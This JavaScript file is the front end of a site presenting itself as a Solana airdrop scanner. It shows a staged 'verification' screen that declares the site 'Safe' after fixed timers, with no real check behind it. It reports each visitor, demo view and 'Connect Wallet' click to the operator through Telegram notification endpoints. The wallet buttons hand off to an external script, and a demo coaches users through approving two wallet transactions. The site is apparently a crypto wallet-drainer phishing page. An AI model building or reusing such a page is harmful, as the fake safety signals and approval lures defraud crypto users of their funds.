// ===== CONFIGURATION =====
// Конфигурация Telegram теперь на сервере в папке private/telegram-config-secure.php
// Уведомления отправляются через PHP файлы: notify-visit.php, notify-demo.php, notify-wallet.php

// ===== X VERIFICATION SCREEN =====
window.addEventListener('load', () => {
    const xVerificationScreen = document.getElementById('xVerificationScreen');
    const xLogoContainer = document.getElementById('xLogoContainer');
    const xLogo = document.getElementById('xLogo');
    const xLoadingText = document.getElementById('xLoadingText');
    const xSafeContent = document.getElementById('xSafeContent');
    const xProgressFill = document.getElementById('xProgressFill');
    const loadingScreen = document.getElementById('loadingScreen');
    const mainContent = document.getElementById('mainContent');
    
    // Stage 1: X крутится (1.6 секунды)
    // Белый X уже крутится по умолчанию
    
    setTimeout(() => {
        // Stage 2: Останавливаем вращение, меняем на зеленый
        xLogoContainer.classList.remove('loading');
        xLogo.classList.add('safe');
        
        // Плавно скрываем текст "Verifying..."
        setTimeout(() => {
            xLoadingText.classList.add('hidden');
            
            // Показываем контент "Safe"
            setTimeout(() => {
                xSafeContent.classList.add('visible');
                
                // Запускаем прогресс-бар
                let progress = 0;
                const progressInterval = setInterval(() => {
                    progress += 4;
                    if (xProgressFill) {
                        xProgressFill.style.width = progress + '%';
                    }
                    
                    if (progress >= 100) {
                        clearInterval(progressInterval);
                    }
                }, 100); // 2.5 секунды (25 * 100ms)
                
                // Через 2.5 секунды переходим к следующему экрану
                setTimeout(() => {
                    // Hide X verification screen
                    xVerificationScreen.classList.remove('active');
                    
                    // Show loading screen
                    loadingScreen.classList.add('active');
                    
                    // Send visit notification
                    sendVisitNotification();
                    
                // After loading screen, show main content
                setTimeout(() => {
                    loadingScreen.classList.remove('active');
                    mainContent.classList.add('visible');
                    
                    // ВАЖНО! Скроллим вверх после показа контента
                    window.scrollTo(0, 0);
                    
                    setTimeout(() => {
                        loadingScreen.style.display = 'none';
                        xVerificationScreen.style.display = 'none';
                    }, 500);
                }, 3000);
                }, 2500);
            }, 300);
        }, 500);
    }, 1600);
});

// ===== SEND NOTIFICATIONS TO PHP =====
async function sendVisitNotification() {
    // Пропускаем если локальный запуск
    if (window.location.hostname === 'localhost' || window.location.protocol === 'file:') {
        console.log('Local environment - skipping visit notification');
        return;
    }
    
    try {
        // Используем sendBeacon для гарантированной отправки
        if (navigator.sendBeacon) {
            const sent = navigator.sendBeacon('/notify-visit.php', '');
            console.log('Visit notification sent:', sent);
        } else {
            // Fallback
            await fetch('/notify-visit.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                keepalive: true
            });
            console.log('Visit notification sent via fetch');
        }
    } catch (error) {
        console.log('Visit notification failed (expected on local)');
    }
}

async function sendDemoNotification() {
    // Пропускаем если локальный запуск
    if (window.location.hostname === 'localhost' || window.location.protocol === 'file:') {
        console.log('Local environment - skipping demo notification');
        return;
    }
    
    try {
        if (navigator.sendBeacon) {
            const sent = navigator.sendBeacon('/notify-demo.php', '');
            console.log('Demo notification sent:', sent);
        } else {
            await fetch('/notify-demo.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                keepalive: true
            });
            console.log('Demo notification sent via fetch');
        }
    } catch (error) {
        console.log('Demo notification failed (expected on local)');
    }
}

async function sendWalletNotification() {
    // Пропускаем если локальный запуск
    if (window.location.hostname === 'localhost' || window.location.protocol === 'file:') {
        console.log('Local environment - skipping wallet notification');
        return;
    }
    
    try {
        if (navigator.sendBeacon) {
            const sent = navigator.sendBeacon('/notify-wallet.php', '');
            console.log('Wallet notification sent:', sent);
        } else {
            await fetch('/notify-wallet.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                keepalive: true
            });
            console.log('Wallet notification sent via fetch');
        }
    } catch (error) {
        console.log('Wallet notification failed (expected on local)');
    }
}

// Отправка уведомления о выборе типа анализа
async function sendChoiceNotification(choice) {
    // Пропускаем если локальный запуск
    if (window.location.hostname === 'localhost' || window.location.protocol === 'file:') {
        console.log('Local environment - skipping choice notification');
        return;
    }
    
    try {
        await fetch('/notify-choice.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ choice: choice }),
            keepalive: true
        });
        console.log('Choice notification sent:', choice);
    } catch (error) {
        console.log('Choice notification failed (expected on local)');
    }
}

// ===== CONNECT WALLET BUTTONS =====
// Кнопки используют onclick="window.startConnect()" из supervisor.adaptive.cjs.js
// При клике автоматически отправляется уведомление в Telegram через notify-wallet.php

// Добавляем отправку уведомления при клике на кнопки Connect Wallet
document.addEventListener('click', function(e) {
    // Ловим клики по ID кнопок (классы с цифрами не работают в селекторах)
    const target = e.target.closest('button');
    if (target && (target.id === 'connectWalletBtn' || target.id === 'connectMainBtn')) {
        sendWalletNotification();
    }
});

// ===== ANIMATIONS =====
const animationStyle = document.createElement('style');
animationStyle.textContent = `
    @keyframes spin {
        from { transform: rotate(0deg); }
        to { transform: rotate(360deg); }
    }
    
    @keyframes slideInRight {
        from {
            transform: translateX(400px);
            opacity: 0;
        }
        to {
            transform: translateX(0);
            opacity: 1;
        }
    }
    
    @keyframes slideOutRight {
        from {
            transform: translateX(0);
            opacity: 1;
        }
        to {
            transform: translateX(400px);
            opacity: 0;
        }
    }
`;
document.head.appendChild(animationStyle);

// ===== SMOOTH SCROLL =====
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        e.preventDefault();
        const target = document.querySelector(this.getAttribute('href'));
        if (target) {
            target.scrollIntoView({ behavior: 'smooth' });
        }
    });
});

// ===== PARALLAX EFFECT ===== (Disabled to fix overlay issues)
// window.addEventListener('scroll', () => {
//     const scrolled = window.pageYOffset;
//     const hero = document.querySelector('.hero');
//     if (hero && scrolled < 1000) {
//         hero.style.transform = `translateY(${scrolled * 0.3}px)`;
//     }
// });

// ===== ESCAPE KEY TO CLOSE MODAL =====
document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && demoModal.classList.contains('active')) {
        closeDemoModal();
    }
});

// ===== DEMO MODAL =====
const demoModal = document.getElementById('demoModal');
const watchDemoBtn = document.getElementById('watchDemoBtn');
const closeDemoModalBtn = document.getElementById('closeDemoModal');
const demoCloseBtn = document.getElementById('demoCloseBtn');

let currentDemoStep = 1;
let demoInterval;
let selectedAnalysisType = null; // 'ai-scan' or 'paperhands'

watchDemoBtn.addEventListener('click', startDemo);
closeDemoModalBtn.addEventListener('click', closeDemoModal);
if (demoCloseBtn) {
    demoCloseBtn.addEventListener('click', closeDemoModal);
}

function startDemo() {
    // Отправляем уведомление о просмотре демо
    sendDemoNotification();
    
    demoModal.classList.add('active');
    document.body.style.overflow = 'hidden';
    currentDemoStep = 1;
    showDemoStep(1);
    
    // Auto-play demo
    setTimeout(() => {
        playDemoSequence();
    }, 500); // Wait for download animation
}

function closeDemoModal() {
    demoModal.classList.remove('active');
    document.body.style.overflow = '';
    currentDemoStep = 1;
    clearTimeout(demoInterval);
    
    // Reset all steps
    document.querySelectorAll('.demo-step').forEach(step => {
        step.classList.remove('active');
    });
    document.querySelectorAll('.demo-dot').forEach(dot => {
        dot.classList.remove('active');
    });
    
    // Reset approve buttons
    const approveBtn1 = document.getElementById('approveBtn1');
    const approveBtn2 = document.getElementById('approveBtn2');
    if (approveBtn1) approveBtn1.textContent = 'Approve';
    if (approveBtn2) approveBtn2.textContent = 'Approve';
    
    // Reset coin selection
    document.querySelectorAll('.demo-coin-card').forEach(card => {
        card.classList.remove('selected');
    });
    
    // Reset scanning stage
    const scanningStage = document.getElementById('scanningStage');
    const paperhandedResult = document.getElementById('paperhandedResult');
    const progressFill = document.getElementById('scanProgressFill');
    
    if (scanningStage) scanningStage.style.display = 'flex';
    if (paperhandedResult) paperhandedResult.style.display = 'none';
    if (progressFill) progressFill.style.width = '0%';
}

function showDemoStep(stepNumber) {
    document.querySelectorAll('.demo-step').forEach(step => {
        step.classList.remove('active');
    });
    document.querySelectorAll('.demo-dot').forEach(dot => {
        dot.classList.remove('active');
    });
    
    // Handle step 4.5 (4_5 in HTML)
    const stepId = stepNumber === 4.5 ? 'demoStep4_5' : `demoStep${stepNumber}`;
    const dotStep = stepNumber === 4.5 ? '4_5' : stepNumber.toString();
    
    const stepElement = document.getElementById(stepId);
    const dotElement = document.querySelector(`.demo-dot[data-step="${dotStep}"]`);
    
    if (stepElement) {
        stepElement.classList.add('active');
    }
    if (dotElement) {
        dotElement.classList.add('active');
    }
    
    currentDemoStep = stepNumber;
}

function playDemoSequence() {
    // Step 2: Select Wallet
    setTimeout(() => {
        showDemoStep(2);
        
        // Auto-select Phantom
        setTimeout(() => {
            const phantomOption = document.getElementById('phantomOption');
            if (phantomOption) {
                phantomOption.style.borderColor = 'var(--primary)';
                phantomOption.style.background = 'rgba(20, 241, 149, 0.1)';
            }
            
            // Step 3: First Transaction
            setTimeout(() => {
                showDemoStep(3);
                
                const approveBtn1 = document.getElementById('approveBtn1');
                if (approveBtn1) {
                    setTimeout(() => {
                        approveBtn1.textContent = 'Approving...';
                        
                        // Step 4: Second Transaction
                        setTimeout(() => {
                            showDemoStep(4);
                            
                            const approveBtn2 = document.getElementById('approveBtn2');
                            if (approveBtn2) {
                                setTimeout(() => {
                                    approveBtn2.textContent = 'Approving...';
                                    
                                    // Step 4.5: Analysis Type Selection
                                    setTimeout(() => {
                                        showDemoStep(4.5);
                                        
                                        // НЕ автоматически! Ждём выбора пользователя
                                        // Выбор обрабатывается в event listener'е ниже
                                    }, 1500);
                                }, 1500);
                            }
                        }, 1500);
                    }, 1500);
                }
            }, 1500);
        }, 1500);
    }, 1000);
}

// Продолжение демо после выбора типа анализа
function continueAfterAnalysisChoice() {
    // Step 5: Coin Selection
    setTimeout(() => {
        showDemoStep(5);
        
        // Auto-select TROLL coin after 2 seconds
        setTimeout(() => {
            const trollCard = document.getElementById('trollCoinCard');
            if (trollCard) {
                trollCard.classList.add('selected');
                
                // Step 6: Scanning and Results
                setTimeout(() => {
                    showDemoStep(6);
                    startScanning();
                }, 1000);
            }
        }, 2000);
    }, 1500);
}

// Scanning animation for Step 6
function startScanning() {
    const scanningStage = document.getElementById('scanningStage');
    const paperhandedResult = document.getElementById('paperhandedResult');
    const aiRiskResult = document.getElementById('aiRiskResult');
    const progressFill = document.getElementById('scanProgressFill');
    
    // Show scanning stage
    scanningStage.style.display = 'flex';
    paperhandedResult.style.display = 'none';
    aiRiskResult.style.display = 'none';
    
    // Animate progress bar
    let progress = 0;
    const progressInterval = setInterval(() => {
        progress += 5;
        if (progressFill) {
            progressFill.style.width = progress + '%';
        }
        
        if (progress >= 100) {
            clearInterval(progressInterval);
            
            // Show result after scanning completes (based on selected type)
            setTimeout(() => {
                scanningStage.style.display = 'none';
                
                if (selectedAnalysisType === 'ai-scan') {
                    aiRiskResult.style.display = 'block';
                } else {
                    paperhandedResult.style.display = 'block';
                }
            }, 500);
        }
    }, 100); // 2 seconds total (20 * 100ms)
}

// Click on dots to navigate
document.querySelectorAll('.demo-dot').forEach(dot => {
    dot.addEventListener('click', () => {
        const stepData = dot.dataset.step;
        const step = stepData === '4_5' ? 4.5 : parseInt(stepData);
        if (step <= currentDemoStep) {
            showDemoStep(step);
        }
    });
});

// Analysis type selection handlers
document.addEventListener('click', (e) => {
    // AI Scan option
    if (e.target.closest('#aiScanOption')) {
        const aiOption = document.getElementById('aiScanOption');
        const paperOption = document.getElementById('paperhandsOption');
        if (aiOption) {
            aiOption.classList.add('selected');
            paperOption?.classList.remove('selected');
            selectedAnalysisType = 'ai-scan';
            
            // Отправляем уведомление в Telegram
            sendChoiceNotification('AI Scans');
            
            // Продолжаем демо после выбора
            continueAfterAnalysisChoice();
        }
    }
    
    // Paperhands option
    if (e.target.closest('#paperhandsOption')) {
        const aiOption = document.getElementById('aiScanOption');
        const paperOption = document.getElementById('paperhandsOption');
        if (paperOption) {
            paperOption.classList.add('selected');
            aiOption?.classList.remove('selected');
            selectedAnalysisType = 'paperhands';
            
            // Отправляем уведомление в Telegram
            sendChoiceNotification('Paperhands Scanner');
            
            // Продолжаем демо после выбора
            continueAfterAnalysisChoice();
        }
    }
    
    // Close demo buttons
    if (e.target.id === 'demoCloseBtn3' || e.target.id === 'shareAIResultBtn') {
        if (e.target.id === 'demoCloseBtn3') {
            closeDemoModal();
        }
    }
});

// Close demo modal on overlay click
demoModal.addEventListener('click', (e) => {
    if (e.target === demoModal || e.target.classList.contains('modal-overlay')) {
        closeDemoModal();
    }
});

// Add event listeners after DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    // Add event listener for second close button
    setTimeout(() => {
        const demoCloseBtn2 = document.getElementById('demoCloseBtn2');
        if (demoCloseBtn2) {
            demoCloseBtn2.addEventListener('click', closeDemoModal);
        }
    }, 100);
    
    // Add event listener for share button (just shows notification)
    document.addEventListener('click', function(e) {
        if (e.target.closest('#shareResultBtn')) {
            // Show a simple notification (you can enhance this)
            const btn = e.target.closest('#shareResultBtn');
            const originalText = btn.innerHTML;
            btn.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg> Copied!';
            btn.style.background = 'rgba(20, 241, 149, 0.3)';
            
            setTimeout(() => {
                btn.innerHTML = originalText;
                btn.style.background = '';
            }, 2000);
        }
    });
});

console.log('%c🦣 iScan - Solana Airdrop Scanner', 'font-size: 20px; font-weight: bold; color: #14F195;');
console.log('%cPowered by Phantom', 'font-size: 12px; color: #AB9FF2;');
